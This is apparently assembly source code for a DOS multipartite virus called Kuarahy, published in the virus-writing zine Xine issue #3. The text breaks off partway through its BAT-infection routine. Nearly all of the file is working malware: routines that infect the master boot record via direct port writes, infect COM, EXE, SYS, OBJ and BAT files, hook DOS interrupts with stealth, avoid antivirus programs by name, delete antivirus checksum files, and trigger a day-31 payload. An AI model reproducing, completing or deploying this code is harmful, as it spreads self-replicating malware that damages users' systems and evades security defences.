   ;
   ;                                         /-----------------------------\
   ;                                         | Xine - issue #3 - Phile 206 |
   ;                                         \-----------------------------/
   ;
   ;
   ;
   ; Comment %
   ;
   ;           Û  ÜÛ             ßßÛßßßßÜ        Û    Û
   ;           Û  Û                Û    Û        Û    Û
   ;           ÛÜÛß   Ü   Û  ÜÜÜ   Û    Û  ÜÜÜ   ÛÜ   Û ViRuS
   ;           ÛßßÛ   Û   Û  ÜÜÜÛ  ÛßßÛß   ÜÜÜÛ  ÛßßßÛÛ Û   Û
   ;           Û  ßÛ  Û   Û Û   Û  Û   Û  Û   Û  Û    Û Û   Û
   ;           Û   ßÛ ßÜÜÜß ßÜÜÜßÜ Û    Û ßÜÜÜßÜ Û    Û  Û  Û
   ;           Programmed by Int13h [iKx]  < < < < < < <  ßßÛ
   ;           > > > > > > > >  in Paraguay, South America  Û
   ;           > > > > > >  Int13h@antisocial.com  < < < ßßß
   ; ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ; ³Multipartite COM/EXE/OVL/SYS/OBJ/BAT/ARJ/BS/MBR multi-encrypted fast infector³
   ; ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
   ;
   ;    Tunnels by PSP tracing. Anti-tunneling.BS/MBR stealth on reads. Two ways
   ;    of hooking Int 21h. Doesn't infects some ugly programs. Protects Int 21h
   ;    in  AX=2521h  and  AX=3521h.  Uses SFT. Doesn't infects philes inmunized
   ;    with CPAV & EXEs with overlays.  Deletes AV checksum philes. Infects MBR
   ;    by  direct  writing  to  HD  ports.  A cool payload activates on days 31.
   ;    Formats an extra track in floppies. It doesn't have a poly engine, but a
   ;    routine  to  change pointer, keyword and operation in the main decryptor.
   ;    The  MBR  can be infected from all the infected hostes. Does other stuph.
   ;    When  I  began  the  code of this virus, I was thinking in add infection
   ;    of .ZIP and .RAR.  Also  I  was studying Zhengxi's way of .LIB infection,
   ;    but  suddenly  I  found  that  this  sucker  has stolen me a whole month,
   ;    then  I  decided  to  stop  it here.  There  will  be  enhaced  versions.
   ;    I lost 1 month of my life. Grrr!, virus coding should be a paid work ;-D
   ;
   ;     Greetz to [29A], [FS], [SGWW], [SLAM], [SVL] and to all my IRC-friends
   ;
   ; %

   ;  Compile under Turbo Assembler 4.0 and Turbo Link 6.10 from Borland Intl.

   .model tiny
   .code
   jumps                                   ; Lazyness r0x0r
   .186
   org 0h

   Longitud        =      (offset FakeHoste-offset Kuarahy)
   Largor          =      (offset Omega-Offset Kuarahy)
   VirusEnPara     =      (Largor+15)/16
   ParraVir1       =      ((Longitud+15)/16)+1
   ParraVir2       =      ((Longitud+15)/16)


   KUARAHY:jmp MuLTiSuCKeo                 ; KUARAHY.4608
           nop

   org 03eh

   MuLTiSuCKeo:
           db      0beh                    ; mov si...
   Pointer:dw      offset Encriptado+07c00h
           mov     cx,0d8h
   Descifra:
           db      02eh
           db      081h,034h               ; xor word ptr [si],...
           ClaveB  dw 0
           inc     si
           inc     si
   Marca:  loop    Descifra

   Encriptado:
           cmp     word ptr ds:[0],020cdh  ; Check 4 PSP
           jne     Desde_Boot_o_MBR        ; looking the INT 20h at field 0
           jmp     Desde_un_Phile          ; Execution from a file

   Desde_Boot_o_MBR:                       ; Execution from MBR or BS
           sub     ax,ax
           cli
           mov     ss,ax                   ; Set SS:SP
           mov     sp,07c00h
           sti

           cld
           push    ss
           pop     ds

           int     12h
           sub     ax,11                   ; Eat 11kb!
           mov     ds:[0413h],ax
           mov     cl,6
           shl     ax,cl
           mov     es,ax                   ; ES is our new house at TOM

           mov     si,07c00h
           xor     di,di
           mov     cx,256
           repe    movsw                   ; Move virus first part at TOM

           mov     ax,0208h                ; Read the other sectors where the
           mov     bx,offset ParteII       ; virus body is stored
           cmp     byte ptr es:[DondeEstamos],'F'
           je      FDisk                   ; Check if we are in a FD or HD

           mov     cx,0003h                ; Track 0, Sector 3
           mov     dx,0080h                ; Head 0
           jmp     short Uplodearse

   FDisk:  mov     cx,5002h                ; Track 80, Sector 2
           sub     dx,dx                   ; Head 0, drive A:
   Uplodearse:
           int     13h
           mov     ax,0208h
           int     13h
           jc      Vamonos
           push    es
           mov     bx,offset Arriba
           push    bx
           retf                            ; Jump to our segment!



   DondeEstamos    db 'F'
   Revisar         db 'S'
   Cuenta          db  0



   ARRiBa: mov     ax,32d
           call    Desde_un_Phile          ; Decrypt encrypted virus body
           mov     byte ptr cs:[Cuenta],0  ; Initialize vars
           mov     byte ptr es:[Revisar],'S'
           mov     byte ptr es:[Bandera],'N'

           mov     ax,word ptr ds:[13h*4]  ; Hook the kewlest int :)
           mov     word ptr es:[Offset_de_la_13h],ax
           mov     word ptr ds:[13h*4],offset Nueva13Handler
           mov     ax,word ptr ds:[(13h*4)+2]
           mov     word ptr es:[Segmento_de_la_13h],ax
           mov     word ptr ds:[(13h*4)+2],es

           mov     ax,0201h                ; Read MBR
           mov     bx,offset MBRBS
           mov     cx,0001h
           mov     dx,0080h
           pushf
           call    dword ptr cs:[Offset_de_la_13h]
           jc      Vamonos                 ; Grrr!

           cmp     word ptr es:[bx+offset Marca],0f7e2h
           je      Vamonos                 ; Infected?

           mov     byte ptr es:[DondeEstamos],'H'
           push    ds
           push    es
           pop     ds
           xor     di,di

   Reutilizar:
           mov     ax,0301h                ; Write original MBR
           mov     bx,offset MBRBS
           mov     cx,0002h                ; Track 0, Sector 2
           mov     dx,0080h                ; Head 0
           int     13h

           mov     byte ptr cs:[QueEs],'b'
           push    di ds es
           mov     bp,020fh                ; Generate an encrypted copy
           call    Encriptor
           pop     es ds di

           mov     si,offset ParaOuting
           mov     bx,offset CopiaVirus    ; Infect MBR via ports
           call    Direct_HD_Write_Using_Ports

           mov     ax,0308h                ; Write the virus body to other sectors
           mov     bx,offset CopiaVirus+200h
           mov     cx,0003h
           mov     dx,0080h
           int     13h

           cmp     di,32                   ; Check our flaggy
           jne     StillWeGo
           ret

   StillWeGo:
           pop     ds
           mov     byte ptr es:[DondeEstamos],'F'

   Vamonos:
           cmp     byte ptr es:[DondeEstamos],'F' ; FD or HD?
           je      Floppy

           mov     dx,0080h                ; Head 0
           mov     cx,0002h                ; Track 0, sector 2
           jmp     short CargarOriginal

   Floppy: xor     dx,dx                   ; Head 0, drive A:
           mov     cx,5001h                ; Track 80, sector 1

   CargarOriginal:
           push    ds
           pop     es
           mov     bx,07c00h
           mov     ax,0201h                ; Load original MBR or BS
           int     13h
           mov     ax,0201h
           int     13h

           db      0eah                    ; Execute the sucker
           dw      07c00h
           dw      0



   Nueva13Handler:
           call    kill_tunnel
           cmp     ax,0cd13h               ; Are you there?
           je      Chequeo
           cmp     ah,03h                  ; Writing?
           je      Hookear_Int21h
           cmp     ah,02h                  ; Reading?
           jne     Normal
           cmp     cx,0001h                ; Track 0, sector 1?
           jne     Normal
           test    dx,dx                   ; Head 0, drive A:?
           je      Infectar
           cmp     dx,0080h                ; Head 0, hard disk?
           je      Stealth_MBR
   Normal: db      0eah
           Offset_de_la_13h   dw 0
           Segmento_de_la_13h dw 0



   Stealth_MBR:
           push    cx
           mov     cl,02h                  ; Read original MBR in user's buffer
           int     13h
           pop     cx
           retf    2



   Stealth_BS:
           push    ax
           push    cx
           push    dx
           mov     ax,0201h
           xor     dx,dx
           mov     cx,5001h                ; Read original BS in fool's buffer
           pushf
           call    dword ptr cs:[Offset_de_la_13h]
           mov     ax,0201h
           pushf
           call    dword ptr cs:[Offset_de_la_13h]
           pop     dx
           pop     cx
           pop     ax
           retf    2



           db      " [KUARAHY]  Koa ha'e Int13h/iKx rembiapoku‚ hina! :) "



   org 1feh
   db 55h,0aah
   org 200h                                ; First sector

   ParteII label byte                      ; Second virus part follow

   Desde_un_Phile:
           db      0beh                    ; mov si...
           Puntero dw 020fh
           mov     cx,((Largor-200h)-0fh)/2
   Decrypta:
           db      02eh
           db      081h,034h               ; xor word ptr [si],...
           ClaveF  dw 0
           inc     si
           inc     si
           loop    Decrypta

           cmp     ax,32
           jne     Getear_Delta
           ret

   Getear_Delta:
           call    Delta
   Delta:  pop     bp
           sub     bp,offset Delta

           cmp     byte ptr cs:[bp+QueEs],'S'
           je      Strategy_Routine        ; Is a .SYS hoste?

           mov     ax,0cd13h               ; Are you there?
           int     21h
           cmp     ax,013cdh
           jne     Instalar
           jmp     MemoriaYaPodrida       ; Yes, I am

   Instalar:
           push    es
           mov     ax,3521h               ; Get INT 21h handler
           int     21h
           mov     cs:[bp+word ptr Abuela21h],bx
           mov     cs:[bp+word ptr Abuela21h+2],es
           mov     cs:[bp+word ptr Real21h],bx
           mov     cs:[bp+word ptr Real21h+2],es

           push    ds

           lds     bx,ds:[0006h]          ; Trace PSP. 10x SLH
   Tracear:cmp     byte ptr ds:[bx],0eah
           jne     Chekear
           lds     bx,ds:[bx+1]
           cmp     word ptr ds:[bx],9090h
           jnz     Tracear
           sub     bx,32h
           cmp     word ptr ds:[bx],9090h
           jne     Chekear
   Hallado:mov     cs:[bp+word ptr Real21h],bx
           mov     cs:[bp+word ptr Real21h+2],ds
           jmp     short MCBTSR
   Chekear:cmp     word ptr ds:[bx],2e1eh
           jnz     MCBTSR
           add     bx,25h
           cmp     word ptr ds:[bx],80fah
           je      Hallado

   MCBTSR: pop     ds

           mov     ax,0cd13h               ; Is virus TSR from BS or MBR?
           int     13h
           cmp     ax,013cdh
           jne     ModificarMCB            ; No, then go and play with MCBs

           push    bx                      ; Yes it is, viral segment in BX
           pop     es                      ; We will hook INT 21h directly
           push    cs
           pop     ds

           lea     si,cs:[bp+word ptr Abuela21h]
           mov     di,offset Abuela21h     ; Fill our variables
           movsw
           movsw

           lea     si,cs:[bp+word ptr Real21h]
           mov     di,offset Real21h
           movsw
           movsw

           xor     ax,ax
           mov     es,ax
           cli
           mov     di,21h*4                ; And hook the int
           mov     ax,offset Viral21Handler
           stosw
           mov     ax,bx
           stosw
           sti

           pop     es

           jmp     MemoriaYaPodrida


   ModificarMCB:
           mov     ax,ds                   ; TSR via MCB
           dec     ax
           mov     es,ax
           mov     ax,es:[3]
           sub     ax,ParraVir1
           xchg    bx,ax
           push    ds
           pop     es
           mov     ah,4ah                 ; Free unused mem
           int     21h

           mov     ah,48h                 ; Allocate mem
           mov     bx,ParraVir2
           int     21h

           dec     ax
           mov     es,ax
           mov     word ptr es:[1],8      ; DOS's
           mov     word ptr es:[8],'Ky'   ; Block name: KY (Kuarahy)
           inc     ax
           mov     es,ax
           xor     di,di

           push    cs
           pop     ds
           lea     si,[bp+offset Kuarahy]
           mov     cx,Longitud
           rep     movsb                  ; Copy virus to our segment

           mov     byte ptr es:[Bandera],'N'
           push    es
           pop     ds
           mov     ax,2521h               ; Hook the int
           mov     dx,offset Viral21Handler
           int     21h

           pop     es

   MemoriaYaPodrida:
           mov     ax,0cafeh              ; Call MBR infection service
           int     21h

           cmp     byte ptr [bp+QueEs],'C'; COM?
           je      CorrerCOM
           cmp     byte ptr [bp+QueEs],'B'; BAT?
           je      CorrerBAT
           cmp     byte ptr [bp+QueEs],'O'; OBJ?
           je      CorrerOBJ
           xor     di,di
           cmp     byte ptr [bp+QueEs],'A' ; ARJ?
           je      CorrerARJ

                                           ; EXE/OVL file
           mov     ah,2ah                  ; Get date
           int     21h

           cmp     dl,31d                  ; Day=31?
           jne     SigaNomas

           mov     di,32
           push    es bp
           call    CorrerARJ               ; Change text fonts
           pop     bp es
           xchg    cx,ax
           int     16h

   SigaNomas:
           push    es
           pop     ds

           mov     bx,bp

           mov     ax,es
           add     ax,10h                  ; Acount 4 PSP
           add     cs:[(bx+CS_IP)+2],ax

           cli
           add     ax,cs:[(bx+SS_SP)+2]
           mov     ss,ax
           mov     sp,cs:[bx+SS_SP]
           sti

           call    Limpiar                 ; Clear regs

           db      0ebh,0h                 ; Clear prefetch queue
           db      0eah                    ; Restore control to .EXE
           CS_IP   dw offset FakeHoste,0h
           SS_SP   dw 0,0



   CorrerCOM:                              ; COM file
           call    Segmentos

           lea     si,[bp+offset Vafer]    ; Points to original bytes
           mov     di,100h
           push    di
           cld
           movsb                           ; Restore them
           movsw

   Limpiar:xor     ax,ax
           sub     bx,bx
           xor     cx,cx
           sub     dx,dx
           xor     si,si
           sub     di,di
           xor     bp,bp
           ret                             ; Run COM or return to caller



   CorrerBAT:                              ; BAT file
           call    segmentos

           mov     ax,word ptr ds:[2ch]    ; Fill the table
           mov     word ptr [bp+FCB1],cs   ; for 4bh execution
           mov     word ptr [bp+FCB2],cs
           mov     word ptr [bp+PSP],ax
           mov     word ptr [bp+SLINEA],cs

           mov     es,word ptr ds:[2ch]    ; Environment segment
           sub     ax,ax
           mov     di,1
   Look4Zero:
           dec     di
           scasw                           ; Look 4 doble-zero
           jnz     Look4Zero

           inc     di                      ; Points to filename
           inc     di

           push    es
           pop     ds
           push    cs
           pop     es                      ; Copy filename to our buffer

           mov     si,di
           lea     di,[bp+offset Signatura]
           mov     cx,128d
           rep     movsb

           push    cs cs
           pop     ds es                   ; CS=DS=ES

           sub     al,al                   ; Look for the 0 of the ASCIIZ string
           lea     di,[bp+offset Signatura]
           mov     cx,125d
           repne   scasb

           mov     word ptr [di-4],'AB'    ; Change extension to .BAT
           mov     byte ptr [di-2],'T'

           mov     si,80h                  ; Command line
           dec     di

           mov     cl,byte ptr ds:[80h]    ; Quantity of characters
           xor     ch,ch
           inc     cl
           mov     si,81h
           rep     movsb

           lea     si,[bp+offset Linea]    ; Move all to the command line in PSP
           mov     di,080h
   Otravez:lodsb
           cmp     al,0dh                  ; ENTER? 0dh
           je      Termino
           stosb
           jmp     OtraVez

   Termino:
           stosb
           sub     di,81h
           mov     cx,di                   ; Calculate new lenght

           mov     byte ptr ds:[080h],cl   ; Update offset 80h of PSP

           cli
           mov     sp,5000d                ; Reajust stack
           sti

           mov     ah,4ah                  ; Free memory
           mov     bx,(Largor+3000)/16
           int     21h

           lea     dx,[bp+offset RunMe]
           mov     ax,4b00h                ; Execute the sucker
           lea     bx,[bp+offset PSP]
           int     21h

           mov     ah,4dh                  ; Get exit code
           int     21h                     ; ERRORLEVEL
           mov     ah,4ch                  ; And exit to DOS
           int     21h



   CorrerOBJ:                              ; OBJ file (COM when compiled)
           call    Segmentos
           lea     si,[bp+offset Copier]   ; Point to our little code
           mov     di,64000                ; Copy it in the heap
           mov     ax,di
           mov     cx,5
           rep     movsw
           movsb

           lea     si,[bp+offset Omega]    ; Points to hoste
           mov     di,100h                 ; Destination offset
           push    di
           mov     cx,60000
           xor     bx,bx
           xor     dx,dx
           jmp     ax

   Copier: repe    movsb                   ; Move host at 100h, in memory
           xor     si,si
           sub     di,di
           xor     ax,ax
           sub     cx,cx
           ret                             ; Give control to him



   CorrerARJ:                              ; ARJ file
           call    Segmentos
           mov     ah,9                    ; Copyright
           lea     dx,[bp+offset Copyright]
           int     21h

           mov     cx,26d
           lea     si,[bp+offset Letras]
           mov     bp,si
           mov     dx,'A'
   Cicling:push    cx
           mov     ax,1100h
           mov     bx,0e00h                ; Change text fonts
           mov     cx,01
           int     10h
           inc     dx
           add     bp,14
           pop     cx
           Loop    Cicling

           cmp     di,32
           jne     SaleAlDos
           ret
   SaleAlDOS:                              ; EXIT to DOS if ARJ, acting like
           int     20h                     ; a shareware program :)



   Viral21Handler:                         ; KUARAHY handler of INT 21h
           call    kill_tunnel
           cmp     ax,0cd13h               ; Resident check
           je      Chequeo
           cmp     ax,0cafeh               ; MBR sucking service
           je      InfectarMBR
           cmp     ah,04bh                 ; Execution
           je      Analizar
           cmp     ah,056h                 ; Rename
           je      Analizar
           cmp     ah,043h                 ; Get/Set attribs
           je      Analizar
           cmp     ah,3dh                  ; Open
           je      Analizar
           cmp     ax,6c00h                ; Extended open
           je      Analizar
           cmp     ax,03521h               ; Protect Int 21h
           je      Ocultar21h_A
           cmp     ax,02521h               ; Protect Int 21h
           je      Ocultar21h_B
           cmp     ax,05700h               ; Hide wrong seconds
           je      Stealth_Segundos1
           cmp     ax,05701h               ; Protect wrong seconds
           je      Stealth_Segundos2
           db      0eah                    ; Normal INT normal
           Abuela21h dw 0,0



   Ocultar21h_A:                           ; Give him the old handler
           mov     bx,cs:[word ptr Abuela21h]
           mov     es,cs:[word ptr Abuela21h+2]
           iret


   Ocultar21h_B:                           ; Put him as the old handler
           mov     cs:[word ptr Abuela21h],dx
           mov     cs:[word ptr Abuela21h+2],ds
           iret



   Stealth_Segundos2:
           push    dx
           push    cx
           mov     ax,5700h
           pushf
           call    dword ptr cs:[Real21h]
           and     cl,00011111b
           cmp     cl,00011110b
           jne     Tranquilopa
           pop     cx
           and     cl,11100000b
           or      cl,00011110b            ; Still marked as infected
           push    cx
   Tranquilopa:
           pop     cx
           pop     dx
           mov     ax,5701h
           pushf
           call    dword ptr cs:[Real21h]
           iret


   Stealth_Segundos1:                      ; Hide wrong seconds
           pushf
           call    dword ptr cs:[Real21h]
           push    cx
           and     cl,00011111b
           cmp     cl,00011110b
           jne     NoPasaNada
           pop     cx
           and     cl,11100000b
           or      cl,1
           push    cx
   NoPasaNada:
           pop     cx
           iret


   Manejador24h:                           ; Error handler
           mov     al,03
           iret



   Analizar:                               ; Check DS:DX 4 victims
           pushf
           push    ax bx cx dx si di bp ds es

           cmp     ax,6c00h
           jne     No_Apertura_Extendida

           cmp     dx,0001
           jne     JustPOPs

           mov     dx,si

   No_Apertura_Extendida:
           push    dx ds

           mov     ax,3524h                ; 24h handler
           int     21h
           mov     word ptr cs:[Vieja24h],bx
           mov     word ptr cs:[(Vieja24h)+2],es
           push    cs
           pop     ds

           mov     ax,2524h                ; Hook it
           mov     dx,offset Manejador24h
           int     21h

           pop     ds dx
           mov     word ptr cs:[Victima],dx
           mov     word ptr cs:[Victima+2],ds
           mov     bx,ds
           push    ds
           pop     es
           cld
           mov     di,dx
           mov     cx,128
           mov     al,'.'                  ; Search the .
           repne   scasb
           jnz     PopAll

           mov     ax,word ptr es:[di-3]   ; Check name
           or      ax,02020h
           cmp     ax,'dn'                 ; commaND
           je      PopAll
           cmp     ax,'na'                 ; scAN / cleAN / tbscAN / tbcleAN
           je      PopAll
           cmp     ax,'va'                 ; tbAV / nAV
           je      PopAll
           cmp     ax,'to'                 ; fool-prOT
           je      PopAll
           cmp     ax,'dr'                 ; guaRD
           je      PopAll
           cmp     ax,'ur'                 ; findviRU
           je      PopAll
           cmp     ax,'ti'                 ; toolkIT
           je      PopAll
           cmp     ax,'pv'                 ; aVP
           je      PopAll
           cmp     ax,'ni'                 ; wIN
           je      PopAll

           push    cs
           pop     es

           mov     si,offset Cabecera
           xchg    si,di                   ; Check extension
           movsw
           movsb

           call    Segmentos
           call    Checar_Ext
           jc      PopAll

   Abrir:  mov     ax,3d00h                ; Open in read-only mode
           pushf
           call    dword ptr cs:[Real21h]
           jc      PopAll
           xchg    bx,ax

           push    cs
           pop     ds

           mov     byte ptr ds:[DondeEstamos],'H'

           push    es bx
           mov     ax,1220h
           int     2fh
           mov     ax,1216h
           xor     bh,bh
           mov     bl,es:[di]
           int     2fh
           mov     cl,byte ptr es:[di+4]   ; Manipulate SFT
           mov     byte ptr [AtribsFile],cl
           mov     byte ptr es:[di+4],20h
           mov     byte ptr es:[di+2],2
           mov     word ptr [SFT],di
           mov     word ptr [SFT+2],es
           pop     bx es

           mov     ax,4301h
           mov     dx,offset Basura1
           sub     cx,cx
           pushf
           call    dword ptr cs:[Real21h]

           mov     ah,41h                  ; Delete AV checksum files
           mov     dx,offset Basura1
           int     21h

           mov     ah,41h
           mov     dx,offset Basura2
           int     21h

           mov     ah,41h
           mov     dx,offset Basura3
           int     21h

           mov     ah,41h
           mov     dx,offset Basura4
           int     21h

           mov     ax,5700h                ; Get time/date
           pushf
           call    dword ptr ds:[Real21h]
           mov     word ptr ds:[Time],cx
           mov     word ptr ds:[Date],dx
           mov     word ptr ds:[TimeDate+2],dx
           and     cl,00011111b
           cmp     cl,00011110b            ; 30*2= ¨60?
           jne     Conti                   ; Infected?
           jmp     PopAll

   Conti:  mov     ah,3fh                  ; Read 45 bytes
           mov     cx,45d
           mov     dx,offset Cabecera
           int     21h

           mov     si,dx
           mov     ax,[si]
           jmp     SaltarAdondeCorresponda


   InfectarCOM:                            ; .COM infection
           push    bx
           mov     ah,30h
           int     21h
           pop     bx
           cmp     al,7                    ; No activity if DOS >=7
           jae     Cerrar

           call    AlFinal
           test    dx,dx
           jnz     Cerrar
           cmp     ax,58000d               ; Check size
           ja      Cerrar
           cmp     ax,666d
           jbe     Cerrar

           cmp     word ptr [si+11d],'TW'  ; Sucked with CPAV?
           je      Cerrar

           mov     di,offset Vafer         ; Take original bytes
           movsw
           movsb

           sub     ax,3
           mov     word ptr [Salto+1],ax

           mov     bp,ax
           add     bp,312h                 ; Encrypt virus
           call    Encriptor

           mov     cx,Largor
           mov     dx,offset CopiaVirus
           mov     ah,40h
           int     21h                     ; Infect file with the encrypted copy

           call    AlInicio

           mov     ah,40h                  ; Put the JMP
           mov     cx,3
           mov     dx,offset Salto
           int     21h

           jmp     SalteAqui



   InfectarEXE:                            ; .EXE infection
           cmp     byte ptr [QueEs],'S'
           je      Cerrar
           cmp     word ptr [si+018h],0040h
           jae     Cerrar

           cmp     word ptr [si+01ah],0000
           jne     Cerrar                  ; Overlay?

           cmp     word ptr [si+43d],'TW'  ; Sucked with CPAV's code?
           je      Cerrar

           call    AlFinal

           mov     cx,512d
           div     cx
           or      dx,dx
           je      NoHayResto
           inc     ax
   NoHayResto:
           cmp     word ptr [si+02h],dx
           jne     Cerrar
           cmp     word ptr [si+04h],ax
           jne     Cerrar

           call    AlFinal                 ; EXE infection in the usual way
           push    bx
           push    dx ax                   ; Size to stack

           les     ax,dword ptr [(Cabecera+014h)]
           mov     [CS_IP],ax
           mov     [(CS_IP+2)],es
           les     ax,dword ptr [(Cabecera+0eh)]
           mov     word ptr [SS_SP],es
           mov     word ptr [(SS_SP+2)],ax

           mov     ax,word ptr [(Cabecera+08h)]
           mov     cl,4
           shl     ax,cl
           xchg    bx,ax
           pop     ax dx                   ; Size from stack
           push    ax dx
           sub     ax,bx
           sbb     dx,0
           mov     cx,10h
           div     cx
           mov     word ptr [(Cabecera+014h)],dx
           mov     bp,dx
           mov     word ptr [(Cabecera+016h)],ax
           mov     word ptr [(Cabecera+0eh)],ax
           mov     word ptr [(Cabecera+010h)],0

           pop     dx  ax

           add     ax,Largor
           adc     dx,0
           mov     cl,9
           push    ax
           shr     ax,cl
           ror     dx,cl
           or      dx,dx
           stc
           adc     dx,ax
           pop     ax
           and     ah,1
           mov     word ptr [(Cabecera+4)],dx
           mov     word ptr [(Cabecera+2)],ax

           mov     ax,word ptr [(Cabecera+0ah)]
           clc
           add     ax,VirusEnPara
           jc      NoAgregarMemoria
           mov     word ptr [(Cabecera+0ah)],ax
   NoAgregarMemoria:
           mov     word ptr [(Cabecera+0ch)],0ffffh

           pop     bx
           add     bp,20fh
           call    Encriptor
           mov     cx,Largor
           mov     ah,40h
           mov     dx,offset CopiaVirus
           int     21h

           call    AlInicio

           mov     ah,40h                  ; Write new header
           mov     cx,01ah
           mov     dx,offset Cabecera
           int     21h

   SalteAqui:
           call    PongoFecha              ; Restore time/date
           call    Reatributear            ; & attributes

   Cerrar: mov     ah,3eh                  ; Close sucker
           int     21h

   PopAll: push    cs
           pop     ds

           mov     ax,2524h
           lds     dx,dword ptr cs:[offset Vieja24h]
           int     21h                     ; Restore Error Handler

   JustPOPs:
           pop     es ds bp di si dx cx bx ax
           popf
           jmp     dword ptr cs:[Abuela21h]



   InfectarSYS:                            ; .SYS infection
           cmp     byte ptr [QueEs],'S'
           jne     Cerrar

           mov     ax,word ptr [si+6]      ; Strategy routine
           mov     word ptr [Vieja_Estrategica],ax

           call    AlFinal

           mov     word ptr [Cabecera+6],ax
           ; Point strategy routine to the second virus decryptor
           add     word ptr [Cabecera+6],offset Desde_un_Phile

           mov     bp,ax
           add     bp,20fh                 ; Encrypt the viruz
           call    Encriptor

           mov     cx,Largor
           mov     ah,40h
           mov     dx,offset CopiaVirus    ; Write to the .SYS
           int     21h

           call    AlInicio

           mov     ah,40h
           mov     cx,10                   ; Write modified SYS header
           mov     dx,offset Cabecera
           int     21h

           jmp     SalteAqui



   Strategy_Routine:                       ; .SYS strategy routine
           db      0b8h
           Vieja_Estrategica dw 0
           push    ax bx cx dx si es ds    ; Old strategy routine in the stack

           push    cs cs
           pop     ds es

           mov     ax,0cd13h               ; Virus in memory?
           int     13h
           cmp     ax,013cdh
           je      Checar_Payload          ; If it is resident, then MBR=infected

           mov     ax,0201h                ; Read MBR
           lea     bx,[bp+offset Omega]
           mov     cx,1
           mov     dx,0080h
           int     13h

           cmp     word ptr es:[bx+offset Marca],0f7e2h
           je      Checar_Payload          ; Infected?

           mov     ax,0301h                ; Write MBR to sector 2
           mov     cx,2
           int     13h

           mov     word ptr es:[bp+offset ClaveF],0
           mov     si,bp
           push    si
           add     si,offset Pointer       ; Modify offset in the 1§ decryptor
           mov     word ptr [si],offset Encriptado+07c00h
           pop     bx
           lea     si,[bp+offset ParaOuting]
           ; Infect MBR using ports
           call    Direct_HD_Write_Using_Ports

           mov     ax,0308h                ; Write virus body in contiguos sectors
           lea     bx,[bp+offset ParteII]
           mov     cx,0003h
           mov     dx,0080h
           int     13h


   Checar_Payload:
           mov     ah,04                   ; Get date
           int     1ah

           cmp     dl,031h                 ; Day=31?
           jne     Popear

           call    Epsilon
   Epsilon:pop     bx
           sub     bx,offset Epsilon

           lea     si,[bx+offset Copyright]
           mov     cx,(offset Hehe-offset Copyright)-1
   Payload:lodsb
           sub     bx,bx
           mov     ah,0eh                  ; Print copyright
           int     10h
           loop    Payload

           xor     ax,ax                   ; Pause
           int     16h

   Popear: pop     ds es si dx cx bx

           sub     ax,ax
           ret                             ; Jump to original strategy routine



   InfectarOBJ:                            ; .OBJ infection
           cmp     byte ptr [QueEs],'O'
           jne     Cerrar
           call    AlInicio
           xor     di,di

   OtroCampo:
           call    Lectura
           cmp     al,0a0h                 ; Kewlest field type ;)
           jz      ModificarValor
           cmp     al,0a2h                 ; Thanx to Stormbringer for his
           jz      ModificarValor          ; Shift_OBJ virus, this is a
           cmp     al,8ah                  ; shorter and less problematic
           jz      Ultimo                  ; variation of his idea :)
           cmp     al,8ch
           jz      Cerrar

   Punterear:
           mov     ax,4201h                ; Move pointer to the following
           xor     cx,cx                   ; field
           int     21h
           jnc     OtroCampo
           jmp     Cerrar


   ModificarValor:
           push    dx
           mov     ax,4201h
           sub     cx,cx
           cwd
           int     21h
           push    dx ax                   ; Save current pointer location

           mov     ah,3fh
           mov     cx,3                    ; Read 3 bytes
           mov     dx,offset Entrada
           int     21h

           or      di,di                   ; Checking flag
           jnz     NoEsElPrimerA0

           inc     di                      ; Modify flag state
           ; IP=100h?
           cmp     word ptr [Entrada+1],100h
           je      NoEsElPrimerA0
           cli
           add     sp,6                    ; Correct stack pointer
           sti
           jmp     Cerrar

   NoEsElPrimerA0:
           ; Modify offset in memory, adding the virus size to it
           add     word ptr [Entrada+1],Largor
           pop     dx cx
           push    cx dx
           mov     ax,4200h                ; Move pointer back
           int     21h

           mov     ah,40h
           mov     dx,offset Entrada       ; Write modified field
           mov     cx,3
           int     21h

           pop     dx cx
           mov     ax,4200h                ; Correct pointer position
           int     21h
           pop     dx
           jmp     Punterear


   Ultimo: mov     cx,0ffffh               ; Pointer to the last field (8a)
           mov     dx,0fffdh
           mov     ax,4201h
           int     21h

           mov     cx,6
           mov     dx,offset VirusOBJRecord
           mov     ah,40h                  ; Write a field for our virus, with
           int     21h                     ; IP=100h then when compiled we will
                                           ; have Virus+Hoste

           mov     bp,030fh
           call    Encriptor               ; Generate an encrypted virus

           mov     ah,40h
           mov     cx,Largor
           mov     dx,offset CopiaVirus    ; Write our encrypted code
           int     21h

           mov     ah,40h
           mov     cx,10                   ; Write the ending field
           mov     dx,offset Finalizacion
           int     21h

           jmp     SalteAqui               ; And dirty work is finished
                                           ; Let's the user start his compiler >:)



   InfectarBAT:                            ; .BAT infection
           call    PongoFecha              ; Mark BAT as infected
           push    es
           call    Reatributear            ; Restore his attribs
           pop     es
           mov     ah,3eh                  ; And close it
           int     21h

           lds     si,dword ptr cs:[Victima]
           mov     di,offset Filename      ; Recover filename
           mov     dx,di

           mov     cx,128
   Followtheblind:
           lodsb
           cmp     al,'.'                  ; Wait for the period
           je      Completa
           stosb                           ; Copy to our buffer
           Loop    Followtheblind

   Completa:
           stosb                           ; Store the .
           push    cs
           pop     ds
           mov     word ptr [di],'OC'
           mov     word ptr [di+2],004dh   ; Adds .COM+0

           mov     ah,3ch                  ; Create that file
           mov     cx,20h
           int     21h
           jc      PopAll
           xchg    bx,ax

           push    dx

           mov     bp,030fh                ; Create encrypted virus copy
           call    Encriptor

           mov     cx,Largor
           mov     ah,40h                  ; And write that to the phile
           mov     dx,offset CopiaVirus
           int     21h

           mov     ah,3eh                  ; Now close it
           int     21h
           pop     dx
           push    dx

           mov     ax,03d02h               ; Open it
           pushf
           call    dword ptr cs:[Real21h]
           xchg    bx,ax

           call    PongoFecha              ; Mark as infected

           mov     ah,3eh                  ; Close it
           int     21h

           pop     dx

           mov     ax,4301h
           mov     cx,23h                  ; Set read-only+hidden attributes
           pushf
           call    dword ptr cs:[Real21h]
